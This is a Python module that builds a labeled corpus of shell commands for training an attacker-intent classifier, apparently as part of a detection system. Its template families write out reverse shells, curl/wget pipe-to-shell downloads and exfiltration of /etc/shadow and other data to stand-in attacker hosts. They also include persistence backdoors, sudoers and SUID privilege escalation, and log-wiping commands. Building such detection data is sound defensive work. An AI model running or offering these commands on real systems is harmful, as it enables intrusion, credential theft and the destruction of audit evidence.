"""
Labeled command -> intent dataset for the ML intent classifier.

Design goals
------------
1. GENUINE data: every command is a realistic shell command an attacker (or a
   benign operator, for the OTHER class) would actually type. No random noise
   strings that would artificially inflate accuracy.
2. LEAKAGE-SAFE by construction: samples are organised into *template families*
   (``family_id``). A family is a group of near-variants generated from ONE
   template. Two evaluation regimes are supported downstream:
       * a standard stratified split on the de-duplicated corpus (no identical
         command string ever crosses the train/test boundary), and
       * a stricter *leave-families-out* split that puts whole families entirely
         in train or test (generalisation to unseen command templates).
   See ``backend.app.ml.split`` and ``backend.app.ml.train``.
3. DETERMINISTIC: a fixed RNG seed makes the corpus reproducible across runs and
   machines, so reported metrics are stable and auditable.

The taxonomy is the 10 canonical intent classes used across the whole system.
"""

from __future__ import annotations

import itertools
import random
from dataclasses import dataclass, field
from typing import Dict, List, Tuple

RANDOM_SEED = 1337
MAX_VARIANTS_PER_FAMILY = 35  # cap combinatorial expansion per template


# --------------------------------------------------------------------------- #
# Placeholder value pools (substituted into templates)                        #
# --------------------------------------------------------------------------- #
POOLS: Dict[str, List[str]] = {
    "IP": [
        "10.0.0.5", "192.168.1.10", "172.16.0.9", "45.33.12.8", "203.0.113.7",
        "185.220.101.4", "8.8.4.4", "198.51.100.42", "10.10.10.100", "192.168.0.105",
        "172.20.1.50", "192.168.100.25", "10.0.2.15", "194.26.29.112", "91.240.118.172",
    ],
    "PORT": [
        "4444", "1337", "8080", "9001", "53", "443", "31337", "12345",
        "8888", "9999", "2222", "80", "8443", "5555", "7777", "6667",
    ],
    "HOST": [
        "evil.example.com", "attacker.test", "c2.example.net", "mirror.badhost.io",
        "pastebin.example", "cdn.malware.test", "update.security-check.net",
        "transfer.sh", "webhook.site", "attacker-c2.darknet", "drop.evilcorp.biz",
    ],
    "PAYLOAD": [
        "payload", "x", "bot", "kdevtmpfsi", "cryptominer", "shell", "malware", "a",
        "xmrig", "dropper", "agent", "rootkit", "sysupdate", "kinsing", "mirai",
    ],
    "TMP": [
        "/tmp", "/dev/shm", "/var/tmp", "/run/user/0", "/tmp/.x", "/dev/shm/.cache", "/var/tmp/.lock",
    ],
    "SENSDIR": [
        "/etc", "/home", "/var/log", "/root", "/opt/app", "/var/www", "/srv",
        "/etc/pam.d", "/etc/nginx", "/var/backups", "/etc/ssh",
    ],
    "USER": [
        "root", "admin", "www-data", "postgres", "deploy", "test", "ubuntu",
        "sysadmin", "developer", "oracle", "jenkins",
    ],
    "PKG": [
        "nmap", "masscan", "gcc", "python3", "tcpdump", "netcat", "socat", "john",
        "tshark", "curl", "wget", "git", "hydra",
    ],
    "SVC": [
        "ssh", "apache2", "nginx", "cron", "mysql", "docker", "rsyslog",
        "auditd", "sshd", "named", "redis", "postgresql",
    ],
    "FLAGS": [
        "-la", "-al", "-lah", "-lt", "-R", "-a", "-lh", "-lart", "-latr", "-1", "-A", "-h",
    ],
    "LOG": [
        "auth.log", "syslog", "messages", "secure", "wtmp", "btmp",
        "daemon.log", "audit/audit.log", "nginx/access.log", "cron.log",
    ],
    "CVE": [
        "CVE-2021-4034", "CVE-2022-0847", "CVE-2021-3156", "CVE-2016-5195",
        "CVE-2014-6271", "CVE-2021-44228", "CVE-2024-1086", "CVE-2024-6387",
    ],
    "EXPBIN": [
        "pwnkit", "dirtycow", "dcow", "overlayfs", "polkit-pwn", "nginxjail",
        "baron_samedit", "kernel_pwn", "looney_tunables",
    ],
}


@dataclass
class Family:
    """A template family: one template string expanded into several variants."""
    family_id: str
    intent: str
    template: str
    variants: List[str] = field(default_factory=list)


# --------------------------------------------------------------------------- #
# Template families, grouped by intent. Each family_id is unique.             #
# --------------------------------------------------------------------------- #
FAMILIES: List[Family] = [
    # ============================ RECONNAISSANCE ============================ #
    Family("recon_whoami", "RECONNAISSANCE", "", ["whoami", "id", "id -u", "id -un", "who am i", "id -g"]),
    Family("recon_uname", "RECONNAISSANCE", "", ["uname -a", "uname -r", "uname -m", "uname -s -r", "uname", "uname -v"]),
    Family("recon_hostname", "RECONNAISSANCE", "", ["hostname", "hostname -f", "hostname -I", "cat /etc/hostname", "hostnamectl"]),
    Family("recon_osrelease", "RECONNAISSANCE", "cat /etc/os-release"),
    Family("recon_issue", "RECONNAISSANCE", "cat /etc/issue"),
    Family("recon_kernel", "RECONNAISSANCE", "cat /proc/version"),
    Family("recon_lscpu", "RECONNAISSANCE", "", ["lscpu", "cat /proc/cpuinfo", "nproc", "cat /proc/meminfo", "free -h", "free -m"]),
    Family("recon_uptime", "RECONNAISSANCE", "", ["uptime", "w", "who", "last", "last -5", "who -a"]),
    Family("recon_env", "RECONNAISSANCE", "", ["env", "printenv", "set", "echo $PATH", "echo $HOME", "printenv PATH"]),
    Family("recon_release2", "RECONNAISSANCE", "cat /etc/lsb-release"),
    Family("recon_arch", "RECONNAISSANCE", "", ["arch", "dpkg --print-architecture", "getconf LONG_BIT", "uname -p"]),
    Family("recon_distro", "RECONNAISSANCE", "cat /etc/debian_version"),
    Family("recon_redhat", "RECONNAISSANCE", "cat /etc/redhat-release"),
    Family("recon_current", "RECONNAISSANCE", "", ["tty", "logname", "groups", "id -Gn", "who -m"]),
    Family("recon_lsbrelease", "RECONNAISSANCE", "", ["lsb_release -a", "lsb_release -d", "lsb_release -i"]),
    Family("recon_dmi", "RECONNAISSANCE", "cat /sys/class/dmi/id/product_name"),
    Family("recon_locale", "RECONNAISSANCE", "", ["locale", "cat /etc/timezone", "echo $LANG"]),
    Family("recon_selinux", "RECONNAISSANCE", "", ["sestatus", "getenforce", "cat /etc/selinux/config"]),
    Family("recon_version_files", "RECONNAISSANCE", "cat /proc/sys/kernel/osrelease"),
    Family("recon_machineid", "RECONNAISSANCE", "cat /etc/machine-id"),

    # ============================== DISCOVERY ============================== #
    Family("disc_ls", "DISCOVERY", "ls {FLAGS}"),
    Family("disc_ls_dir", "DISCOVERY", "ls {FLAGS} {SENSDIR}"),
    Family("disc_find_file", "DISCOVERY", "find {SENSDIR} -name '*.conf'"),
    Family("disc_find_type", "DISCOVERY", "find / -type f -name '*.log' 2>/dev/null"),
    Family("disc_ps", "DISCOVERY", "", ["ps aux", "ps -ef", "ps -aux", "top -bn1", "htop", "ps fauxww"]),
    Family("disc_netstat", "DISCOVERY", "", ["netstat -tulpn", "netstat -antp", "ss -tulpn", "ss -antp", "netstat -rn"]),
    Family("disc_ip", "DISCOVERY", "", ["ip a", "ip r", "ip addr show", "ifconfig", "ifconfig -a", "ip link"]),
    Family("disc_arp", "DISCOVERY", "", ["arp -a", "arp -n", "route -n", "ip neigh", "route"]),
    Family("disc_passwd", "DISCOVERY", "cat /etc/passwd"),
    Family("disc_hosts", "DISCOVERY", "cat /etc/hosts"),
    Family("disc_resolv", "DISCOVERY", "cat /etc/resolv.conf"),
    Family("disc_mount", "DISCOVERY", "", ["mount", "df -h", "lsblk", "cat /proc/mounts", "findmnt", "df -hT"]),
    Family("disc_which", "DISCOVERY", "which {PKG}"),
    Family("disc_whereis", "DISCOVERY", "whereis {PKG}"),
    Family("disc_netconn", "DISCOVERY", "cat /proc/net/tcp"),
    Family("disc_listtmp", "DISCOVERY", "ls -la {TMP}"),
    Family("disc_dpkg", "DISCOVERY", "", ["dpkg -l", "rpm -qa", "apt list --installed", "yum list installed"]),
    Family("disc_group", "DISCOVERY", "cat /etc/group"),
    Family("disc_fstab", "DISCOVERY", "cat /etc/fstab"),
    Family("disc_iptables", "DISCOVERY", "", ["iptables -L", "iptables -L -n", "ufw status", "iptables -S"]),
    Family("disc_lshome", "DISCOVERY", "ls -la /home"),
    Family("disc_tree", "DISCOVERY", "", ["tree /var/www", "tree -L 2 /opt", "du -sh /home/*"]),
    Family("disc_stat", "DISCOVERY", "stat /etc/passwd"),
    Family("disc_getent", "DISCOVERY", "getent passwd"),
    Family("disc_services", "DISCOVERY", "", ["systemctl list-units --type=service", "service --status-all", "systemctl status"]),
    Family("disc_locate", "DISCOVERY", "", ["locate id_rsa", "locate .conf", "updatedb"]),
    Family("disc_lsof", "DISCOVERY", "", ["lsof -i", "lsof -nP", "fuser 80/tcp"]),
    Family("disc_crontabs_ls", "DISCOVERY", "ls -la /etc/cron.d"),
    Family("disc_scan", "DISCOVERY", "nmap -sV {IP}"),
    Family("disc_scan2", "DISCOVERY", "nmap -p- {IP}"),

    # ========================== CREDENTIAL_ACCESS ========================== #
    Family("cred_shadow", "CREDENTIAL_ACCESS", "cat /etc/shadow"),
    Family("cred_gshadow", "CREDENTIAL_ACCESS", "cat /etc/gshadow"),
    Family("cred_idrsa", "CREDENTIAL_ACCESS", "cat /home/{USER}/.ssh/id_rsa"),
    Family("cred_idrsa_root", "CREDENTIAL_ACCESS", "cat /root/.ssh/id_rsa"),
    Family("cred_ided25519", "CREDENTIAL_ACCESS", "cat /home/{USER}/.ssh/id_ed25519"),
    Family("cred_sshdir", "CREDENTIAL_ACCESS", "ls -la /home/{USER}/.ssh"),
    Family("cred_history", "CREDENTIAL_ACCESS", "cat /home/{USER}/.bash_history"),
    Family("cred_grep_pass", "CREDENTIAL_ACCESS", "grep -ri password {SENSDIR}"),
    Family("cred_grep_key", "CREDENTIAL_ACCESS", "grep -ri 'secret\\|token\\|api_key' {SENSDIR}"),
    Family("cred_find_key", "CREDENTIAL_ACCESS", "find / -name 'id_rsa' 2>/dev/null"),
    Family("cred_find_pem", "CREDENTIAL_ACCESS", "find / -name '*.pem' 2>/dev/null"),
    Family("cred_mysql_hist", "CREDENTIAL_ACCESS", "cat /home/{USER}/.mysql_history"),
    Family("cred_aws", "CREDENTIAL_ACCESS", "cat /home/{USER}/.aws/credentials"),
    Family("cred_dump", "CREDENTIAL_ACCESS", "", ["cat /etc/shadow /etc/passwd", "unshadow /etc/passwd /etc/shadow", "getent shadow"]),
    Family("cred_ssh_config", "CREDENTIAL_ACCESS", "cat /home/{USER}/.ssh/config"),
    Family("cred_env_secret", "CREDENTIAL_ACCESS", "cat /var/www/.env"),
    Family("cred_memory", "CREDENTIAL_ACCESS", "strings /proc/self/environ"),
    Family("cred_wpconfig", "CREDENTIAL_ACCESS", "cat /var/www/html/wp-config.php"),
    Family("cred_gitcred", "CREDENTIAL_ACCESS", "cat /home/{USER}/.git-credentials"),
    Family("cred_netrc", "CREDENTIAL_ACCESS", "cat /home/{USER}/.netrc"),
    Family("cred_pgpass", "CREDENTIAL_ACCESS", "cat /home/{USER}/.pgpass"),
    Family("cred_dockercfg", "CREDENTIAL_ACCESS", "cat /home/{USER}/.docker/config.json"),
    Family("cred_crack", "CREDENTIAL_ACCESS", "", ["john --wordlist=rockyou.txt hash.txt", "hashcat -m 1800 hash.txt rockyou.txt", "john shadow"]),
    Family("cred_knownhosts", "CREDENTIAL_ACCESS", "cat /home/{USER}/.ssh/known_hosts"),
    Family("cred_authkeys_read", "CREDENTIAL_ACCESS", "cat /home/{USER}/.ssh/authorized_keys"),
    Family("cred_k8s", "CREDENTIAL_ACCESS", "kubectl get secrets -o yaml"),
    Family("cred_lazagne", "CREDENTIAL_ACCESS", "python3 laZagne.py all"),

    # ============================== EXECUTION ============================== #
    Family("exec_wget_pipe", "EXECUTION", "wget -qO- http://{HOST}/{PAYLOAD}.sh | sh"),
    Family("exec_curl_pipe", "EXECUTION", "curl -s http://{HOST}/{PAYLOAD}.sh | bash"),
    Family("exec_wget_chmod", "EXECUTION", "wget http://{IP}/{PAYLOAD} -O {TMP}/{PAYLOAD}; chmod +x {TMP}/{PAYLOAD}; {TMP}/{PAYLOAD}"),
    Family("exec_revsh_bash", "EXECUTION", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"),
    Family("exec_nc_exec", "EXECUTION", "nc {IP} {PORT} -e /bin/sh"),
    Family("exec_python_rev", "EXECUTION", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"),
    Family("exec_perl_rev", "EXECUTION", "perl -e 'use Socket;connect(S,sockaddr_in({PORT},inet_aton(\"{IP}\")))'"),
    Family("exec_chmod_run", "EXECUTION", "chmod 777 {TMP}/{PAYLOAD} && {TMP}/{PAYLOAD}"),
    Family("exec_curl_out", "EXECUTION", "curl -o {TMP}/{PAYLOAD} http://{HOST}/{PAYLOAD} && ./{PAYLOAD}"),
    Family("exec_sh_c", "EXECUTION", "sh -c 'cd {TMP} && ./{PAYLOAD}'"),
    Family("exec_tftp", "EXECUTION", "tftp -g -r {PAYLOAD} {IP}; chmod +x {PAYLOAD}; ./{PAYLOAD}"),
    Family("exec_wget_multi", "EXECUTION", "cd {TMP}; wget http://{HOST}/{PAYLOAD}; chmod +x {PAYLOAD}; ./{PAYLOAD}"),
    Family("exec_busybox", "EXECUTION", "busybox wget http://{IP}/{PAYLOAD} -O {PAYLOAD}"),
    Family("exec_socat", "EXECUTION", "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr"),
    Family("exec_php_rev", "EXECUTION", "php -r '$s=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    Family("exec_ncat", "EXECUTION", "ncat {IP} {PORT} -e /bin/bash"),
    Family("exec_base64", "EXECUTION", "echo {PAYLOAD} | base64 -d | bash"),
    Family("exec_python_system", "EXECUTION", "python3 -c 'import os;os.system(\"/bin/sh\")'"),
    Family("exec_mkfifo", "EXECUTION", "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"),
    Family("exec_curl_run_tmp", "EXECUTION", "cd {TMP} && curl -O http://{HOST}/{PAYLOAD} && chmod +x {PAYLOAD} && ./{PAYLOAD}"),
    Family("exec_wget_https", "EXECUTION", "wget https://{HOST}/{PAYLOAD}.sh -O- | bash"),
    Family("exec_eval", "EXECUTION", "eval $(curl -s http://{HOST}/{PAYLOAD})"),
    Family("exec_setsid", "EXECUTION", "setsid bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"),
    Family("exec_nohup_payload", "EXECUTION", "nohup {TMP}/{PAYLOAD} > /dev/null 2>&1 &"),

    # ========================= PRIVILEGE_ESCALATION ========================= #
    Family("priv_sudo_l", "PRIVILEGE_ESCALATION", "sudo -l"),
    Family("priv_sudo_bash", "PRIVILEGE_ESCALATION", "", ["sudo -i", "sudo -s", "sudo su -", "sudo /bin/bash", "sudo /bin/sh"]),
    Family("priv_su", "PRIVILEGE_ESCALATION", "", ["su -", "su root", "su - root", "su"]),
    Family("priv_suid_find", "PRIVILEGE_ESCALATION", "find / -perm -4000 -type f 2>/dev/null"),
    Family("priv_suid_u", "PRIVILEGE_ESCALATION", "find / -perm -u=s -type f 2>/dev/null"),
    Family("priv_pkexec", "PRIVILEGE_ESCALATION", "pkexec /bin/sh"),
    Family("priv_capabilities", "PRIVILEGE_ESCALATION", "getcap -r / 2>/dev/null"),
    Family("priv_kernel_exploit", "PRIVILEGE_ESCALATION", "gcc {TMP}/exploit.c -o {TMP}/exploit && {TMP}/exploit"),
    Family("priv_writable_passwd", "PRIVILEGE_ESCALATION", "echo 'toor:x:0:0:root:/root:/bin/bash' >> /etc/passwd"),
    Family("priv_chmod_suid", "PRIVILEGE_ESCALATION", "chmod +s /bin/bash"),
    Family("priv_doas", "PRIVILEGE_ESCALATION", "doas /bin/sh"),
    Family("priv_sudo_version", "PRIVILEGE_ESCALATION", "sudo --version"),
    Family("priv_sudoers", "PRIVILEGE_ESCALATION", "", ["cat /etc/sudoers", "ls -la /etc/sudoers.d", "cat /etc/sudoers.d/*"]),
    Family("priv_ldpreload", "PRIVILEGE_ESCALATION", "sudo LD_PRELOAD=/tmp/x.so id"),
    Family("priv_cpbash", "PRIVILEGE_ESCALATION", "cp /bin/bash {TMP}/rootbash && chmod +s {TMP}/rootbash"),
    Family("priv_sudo_neg", "PRIVILEGE_ESCALATION", "sudo -u#-1 /bin/bash"),
    Family("priv_writable_find", "PRIVILEGE_ESCALATION", "find / -writable -type d 2>/dev/null"),
    Family("priv_gtfobins", "PRIVILEGE_ESCALATION", "", ["sudo find . -exec /bin/sh \\; -quit", "sudo vim -c ':!/bin/sh'", "sudo less /etc/profile"]),
    Family("priv_capsh", "PRIVILEGE_ESCALATION", "capsh --print"),
    Family("priv_docker", "PRIVILEGE_ESCALATION", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    Family("priv_setuid_c", "PRIVILEGE_ESCALATION", "echo 'int main(){setuid(0);system(\"/bin/sh\");}' > {TMP}/s.c"),

    # ============================= PERSISTENCE ============================= #
    Family("persist_authkeys", "PERSISTENCE", "echo 'ssh-rsa AAAAB3Nza attacker@evil' >> /home/{USER}/.ssh/authorized_keys"),
    Family("persist_crontab_e", "PERSISTENCE", "", ["crontab -e", "crontab -l", "crontab -r"]),
    Family("persist_cron_echo", "PERSISTENCE", "echo '* * * * * curl -s http://{HOST}/{PAYLOAD}.sh | sh' >> /etc/crontab"),
    Family("persist_cron_spool", "PERSISTENCE", "echo '@reboot {TMP}/{PAYLOAD}' >> /var/spool/cron/crontabs/{USER}"),
    Family("persist_systemd", "PERSISTENCE", "systemctl enable {SVC}"),
    Family("persist_useradd", "PERSISTENCE", "useradd -o -u 0 -g 0 backdoor"),
    Family("persist_adduser_sudo", "PERSISTENCE", "usermod -aG sudo {USER}"),
    Family("persist_rc_local", "PERSISTENCE", "echo '{TMP}/{PAYLOAD} &' >> /etc/rc.local"),
    Family("persist_bashrc", "PERSISTENCE", "echo 'curl -s http://{IP}/{PAYLOAD}|sh' >> /home/{USER}/.bashrc"),
    Family("persist_service", "PERSISTENCE", "chkconfig {SVC} on"),
    Family("persist_ssh_key2", "PERSISTENCE", "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3 evil' >> /root/.ssh/authorized_keys"),
    Family("persist_systemd_file", "PERSISTENCE", "cp {TMP}/{PAYLOAD}.service /etc/systemd/system/"),
    Family("persist_atjob", "PERSISTENCE", "echo '{TMP}/{PAYLOAD}' | at now + 1 minute"),
    Family("persist_initd", "PERSISTENCE", "cp {TMP}/{PAYLOAD} /etc/init.d/ && update-rc.d {PAYLOAD} defaults"),
    Family("persist_profile", "PERSISTENCE", "echo '{TMP}/{PAYLOAD} &' >> /etc/profile"),
    Family("persist_ldso", "PERSISTENCE", "echo '/tmp/evil.so' >> /etc/ld.so.preload"),
    Family("persist_motd", "PERSISTENCE", "echo 'curl http://{IP}/{PAYLOAD}|sh' >> /etc/update-motd.d/00-header"),
    Family("persist_keygen", "PERSISTENCE", "ssh-keygen -f /tmp/k -N '' && cat /tmp/k.pub >> /root/.ssh/authorized_keys"),
    Family("persist_newuser", "PERSISTENCE", "", ["adduser --disabled-password backdoor", "useradd -m -s /bin/bash hacker"]),
    Family("persist_passwd_set", "PERSISTENCE", "echo 'backdoor:Passw0rd' | chpasswd"),

    # ============================= EXPLOITATION ============================= #
    Family("exploit_shellshock", "EXPLOITATION", "() { :; }; echo vulnerable; /bin/bash -c 'id'"),
    Family("exploit_dirtycow", "EXPLOITATION", "", ["gcc dirtycow.c -o dcow -pthread && ./dcow", "./dirtycow", "./dcow"]),
    Family("exploit_pwnkit", "EXPLOITATION", "", ["./pwnkit", "gcc pwnkit.c -o pwnkit && ./pwnkit"]),
    Family("exploit_overlayfs", "EXPLOITATION", "./overlayfs_exploit"),
    Family("exploit_searchsploit", "EXPLOITATION", "searchsploit {CVE}"),
    Family("exploit_cve_py", "EXPLOITATION", "python3 {CVE}.py --target {IP}"),
    Family("exploit_expbin", "EXPLOITATION", "./{EXPBIN}"),
    Family("exploit_expbin_build", "EXPLOITATION", "gcc {EXPBIN}.c -o {EXPBIN} && ./{EXPBIN}"),
    Family("exploit_log4j", "EXPLOITATION", "curl 'http://{IP}/?x=${jndi:ldap://{HOST}/a}'"),
    Family("exploit_sqli", "EXPLOITATION", "sqlmap -u http://{HOST}/x?id=1 --dump"),
    Family("exploit_metasploit", "EXPLOITATION", "", ["msfconsole -x 'use exploit/multi/handler'", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} -f elf"]),
    Family("exploit_nmap_vuln", "EXPLOITATION", "nmap --script vuln {IP}"),
    Family("exploit_polkit", "EXPLOITATION", "./polkit-exploit"),
    Family("exploit_poc", "EXPLOITATION", "python3 poc.py {IP} {PORT}"),
    Family("exploit_eternalblue", "EXPLOITATION", "python3 eternalblue_exploit.py {IP}"),
    Family("exploit_struts", "EXPLOITATION", "curl -s http://{HOST} -H 'Content-Type: %{(#cmd=\"id\")}'"),
    Family("exploit_proftpd", "EXPLOITATION", "./proftpd_mod_copy_exploit {IP}"),
    Family("exploit_local_root", "EXPLOITATION", "./local_root_exploit"),

    # ============================= EXFILTRATION ============================= #
    Family("exfil_tar_curl", "EXFILTRATION", "tar czf - {SENSDIR} | curl -F file=@- http://{HOST}/up"),
    Family("exfil_scp", "EXFILTRATION", "scp -r {SENSDIR} {USER}@{IP}:/loot"),
    Family("exfil_rsync", "EXFILTRATION", "rsync -avz {SENSDIR} {USER}@{IP}:/data"),
    Family("exfil_curl_post", "EXFILTRATION", "curl -X POST --data-binary @/etc/passwd http://{HOST}/x"),
    Family("exfil_nc", "EXFILTRATION", "nc {IP} {PORT} < /etc/shadow"),
    Family("exfil_tar_out", "EXFILTRATION", "tar czf {TMP}/loot.tar.gz {SENSDIR}"),
    Family("exfil_zip", "EXFILTRATION", "zip -r {TMP}/data.zip {SENSDIR}"),
    Family("exfil_upload", "EXFILTRATION", "curl --upload-file /etc/shadow http://{HOST}/s"),
    Family("exfil_wget_post", "EXFILTRATION", "wget --post-file=/etc/passwd http://{IP}/c"),
    Family("exfil_dns", "EXFILTRATION", "for f in $(cat /etc/passwd); do nslookup $f.{HOST}; done"),
    Family("exfil_base64", "EXFILTRATION", "base64 /etc/shadow | curl -d @- http://{HOST}/e"),
    Family("exfil_mysqldump", "EXFILTRATION", "mysqldump --all-databases | nc {IP} {PORT}"),
    Family("exfil_scp_file", "EXFILTRATION", "scp /etc/shadow {USER}@{IP}:/tmp/s"),
    Family("exfil_ftp", "EXFILTRATION", "ftp -n {IP} <<< 'put /etc/passwd'"),
    Family("exfil_s3", "EXFILTRATION", "aws s3 cp {SENSDIR}/secret.db s3://attacker-bucket/"),
    Family("exfil_gzip_nc", "EXFILTRATION", "gzip -c /var/log/{LOG} | nc {IP} {PORT}"),
    Family("exfil_curl_T", "EXFILTRATION", "curl -T /etc/shadow ftp://{IP}/"),
    Family("exfil_split_upload", "EXFILTRATION", "split -b 1M loot.tar.gz && for p in x*; do curl -F f=@$p http://{HOST}/u; done"),

    # =============================== CLEANUP =============================== #
    Family("clean_hist_c", "CLEANUP", "", ["history -c", "history -w", "history -cw"]),
    Family("clean_rm_hist", "CLEANUP", "rm -f /home/{USER}/.bash_history"),
    Family("clean_unset_hist", "CLEANUP", "unset HISTFILE"),
    Family("clean_histsize", "CLEANUP", "export HISTSIZE=0"),
    Family("clean_rm_logs", "CLEANUP", "rm -rf /var/log/*"),
    Family("clean_shred", "CLEANUP", "shred -u /home/{USER}/.bash_history"),
    Family("clean_truncate_log", "CLEANUP", "", ["echo > /var/log/auth.log", "cat /dev/null > /var/log/syslog", ": > /var/log/wtmp"]),
    Family("clean_wtmp", "CLEANUP", "rm -f /var/log/wtmp /var/log/btmp /var/log/lastlog"),
    Family("clean_ln_devnull", "CLEANUP", "ln -sf /dev/null /home/{USER}/.bash_history"),
    Family("clean_rm_payload", "CLEANUP", "rm -f {TMP}/{PAYLOAD}"),
    Family("clean_dmesg", "CLEANUP", "dmesg -c"),
    Family("clean_truncate_cmd", "CLEANUP", "truncate -s0 /var/log/{LOG}"),
    Family("clean_journal", "CLEANUP", "journalctl --vacuum-time=1s"),
    Family("clean_sed_log", "CLEANUP", "sed -i '/{IP}/d' /var/log/{LOG}"),
    Family("clean_chattr", "CLEANUP", "chattr -i /var/log/{LOG} && rm -f /var/log/{LOG}"),
    Family("clean_rmtmp", "CLEANUP", "rm -rf {TMP}/*"),
    Family("clean_viminfo", "CLEANUP", "rm -f /home/{USER}/.viminfo"),
    Family("clean_kill_audit", "CLEANUP", "", ["service auditd stop", "systemctl stop rsyslog", "pkill -9 auditd"]),

    # ================================ OTHER ================================ #
    Family("other_echo", "OTHER", "", ["echo hello", "echo test", "echo 123", "echo $USER", "echo done"]),
    Family("other_pwd", "OTHER", "", ["pwd", "cd /tmp", "cd ..", "cd ~", "cd -", "cd /home"]),
    Family("other_date", "OTHER", "", ["date", "cal", "date +%s", "timedatectl", "cal 2026"]),
    Family("other_clear", "OTHER", "", ["clear", "reset", "tput clear"]),
    Family("other_help", "OTHER", "", ["help", "man ls", "ls --help", "--help", "man bash"]),
    Family("other_editor", "OTHER", "", ["nano notes.txt", "vi file.txt", "vim readme.md", "cat readme.txt", "emacs f.txt"]),
    Family("other_exit", "OTHER", "", ["exit", "logout", "quit", "bye"]),
    Family("other_ping", "OTHER", "ping -c 4 {HOST}"),
    Family("other_apt", "OTHER", "", ["apt update", "apt-get install curl", "yum update", "apt list", "apt upgrade"]),
    Family("other_gibberish", "OTHER", "", ["asdf", "test123", "hello world", "fooo", "...", "qwerty"]),
    Family("other_fileops", "OTHER", "", ["mkdir project", "touch file.txt", "cp a.txt b.txt", "mv a b", "rmdir old"]),
    Family("other_dev", "OTHER", "", ["git status", "git pull", "npm install", "python app.py", "make", "node index.js"]),
    Family("other_echo_write", "OTHER", "echo 'note' > /home/{USER}/todo.txt"),
    Family("other_sleep", "OTHER", "", ["sleep 5", "sleep 10", "wait", "true", "false"]),
    Family("other_textutil", "OTHER", "", ["wc -l file.txt", "sort names.txt", "head file.txt", "tail file.txt", "less file.txt"]),
    Family("other_calc", "OTHER", "", ["expr 1 + 1", "echo $((2*3))", "bc -l"]),
    Family("other_greet", "OTHER", "", ["hello", "hi", "whats up", "ok", "yes"]),
    Family("other_alias", "OTHER", "", ["alias", "type ls", "command -v git", "hash"]),

    # -------- targeted additions to strengthen weaker / confusable classes -------- #
    # RECONNAISSANCE: self / system identity signals (distinct from enumerating the env)
    Family("recon_procself", "RECONNAISSANCE", "cat /proc/self/status"),
    Family("recon_idctx", "RECONNAISSANCE", "", ["echo $UID", "echo $EUID", "id -Z", "whoami && hostname"]),
    Family("recon_kernelver", "RECONNAISSANCE", "", ["sysctl kernel.osrelease", "cat /proc/sys/kernel/version", "uname --kernel-name"]),
    Family("recon_loadavg", "RECONNAISSANCE", "cat /proc/loadavg"),
    Family("recon_release_glob", "RECONNAISSANCE", "cat /etc/*-release"),
    Family("recon_motd", "RECONNAISSANCE", "cat /var/run/motd"),
    Family("recon_uname_flags", "RECONNAISSANCE", "", ["uname -o", "uname -i", "uname -n", "uname -p -i"]),
    Family("recon_virt", "RECONNAISSANCE", "", ["systemd-detect-virt", "dmesg | grep -i hypervisor", "cat /sys/class/dmi/id/sys_vendor"]),

    # PRIVILEGE_ESCALATION: broaden the smallest class with distinct real techniques
    Family("priv_sudo_probe", "PRIVILEGE_ESCALATION", "", ["sudo -V", "sudo -k", "sudo id", "sudo -n true"]),
    Family("priv_sudo_run", "PRIVILEGE_ESCALATION", "sudo -u root /bin/bash"),
    Family("priv_sgid_find", "PRIVILEGE_ESCALATION", "find / -perm -2000 -type f 2>/dev/null"),
    Family("priv_gtfobins2", "PRIVILEGE_ESCALATION", "", ["awk 'BEGIN {system(\"/bin/sh\")}'", "sudo awk 'BEGIN{system(\"/bin/sh\")}'", "perl -e 'exec \"/bin/sh\";'"]),
    Family("priv_chmod_find", "PRIVILEGE_ESCALATION", "chmod u+s /usr/bin/find"),
    Family("priv_sudoers_echo", "PRIVILEGE_ESCALATION", "echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
    Family("priv_env_path", "PRIVILEGE_ESCALATION", "sudo PATH=/tmp:$PATH /usr/bin/some_tool"),
    Family("priv_nmap_interactive", "PRIVILEGE_ESCALATION", "sudo nmap --interactive"),
    Family("priv_sudo_edit", "PRIVILEGE_ESCALATION", "", ["sudo vi -c ':!/bin/sh'", "sudo less /etc/hosts", "sudo man man"]),

    # DISCOVERY: more environment-enumeration variety (distinct from self identity)
    Family("disc_ls_recursive", "DISCOVERY", "ls -R /home"),
    Family("disc_find_bak", "DISCOVERY", "find / -name '*.bak' 2>/dev/null"),
    Family("disc_net_extra", "DISCOVERY", "", ["cat /proc/net/udp", "netstat -i", "ip -s link", "cat /etc/networks"]),
    Family("disc_nfs", "DISCOVERY", "", ["showmount -e localhost", "cat /etc/exports", "rpcinfo -p"]),
    Family("disc_users", "DISCOVERY", "", ["cut -d: -f1 /etc/passwd", "awk -F: '{print $1}' /etc/passwd", "compgen -u"]),
    Family("disc_cron_list", "DISCOVERY", "", ["ls -la /etc/cron.daily", "cat /etc/crontab", "ls /var/spool/cron"]),

    # OTHER: more clearly-benign operator activity to sharpen the boundary
    Family("other_versions", "OTHER", "", ["python3 --version", "gcc --version", "curl --version", "git --version", "node --version"]),
    Family("other_textgen", "OTHER", "", ["printf hello", "seq 1 5", "echo foo bar", "yes | head -3"]),
    Family("other_session", "OTHER", "", ["screen -ls", "tmux ls", "jobs", "fg", "bg", "history"]),
    Family("other_shellcfg", "OTHER", "", ["export EDITOR=vim", "source ~/.bashrc", "set -o vi", "shopt"]),
    Family("other_misc", "OTHER", "", ["watch date", "echo working", "true && echo ok", "sleep 2 && echo hi"]),
    Family("other_readme", "OTHER", "", ["cat README.md", "cat notes.txt", "less todo.txt", "head -n 5 log.txt"]),
]


SHELL_WRAPPERS: List[str] = [
    "{cmd}",
    "{cmd} 2>/dev/null",
    "{cmd} 2>&1",
    "{cmd} | head -n 10",
    "{cmd} | head -n 5",
    "{cmd} | tail -n 10",
    "{cmd} | tail -n 5",
    "{cmd} | more",
    "{cmd} | less",
